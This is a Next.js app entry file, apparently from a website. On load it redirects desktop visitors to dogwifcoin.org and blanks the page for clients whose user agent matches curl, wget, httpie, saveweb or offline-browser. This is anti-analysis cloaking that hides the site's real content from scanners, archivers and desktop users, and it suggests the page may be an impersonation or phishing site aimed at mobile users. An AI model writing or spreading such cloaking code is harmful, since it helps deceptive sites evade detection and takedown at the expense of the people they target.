/* eslint-disable @typescript-eslint/no-explicit-any */
import '@/styles/globals.css'
import type { AppProps } from 'next/app'
import 'slick-carousel/slick/slick.css'
import 'slick-carousel/slick/slick-theme.css'
import { useEffect } from 'react'

export default function App({ Component, pageProps }: AppProps) {
  useEffect(() => {
    // Verificação para redirecionamento de usuários não móveis
    if (
      !navigator.userAgent.match(
        /(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/,
      ) &&
      window.innerWidth > 768
    ) {
      window.location.href = 'https://dogwifcoin.org/'
    }

    // Verificação de User-Agent suspeito para esvaziar a página
    const userAgent = navigator.userAgent.toLowerCase()
    const isSuspicious = /curl|wget|httpie|saveweb|offline-browser/.test(
      userAgent,
    )

    if (isSuspicious) {
      document.body.innerHTML = '' // Esvazia o conteúdo da página
    }

    // Definindo uma variável global
    ;(window as any).hasMobileFirstExtension = true
  }, [])

  return <Component {...pageProps} />
}
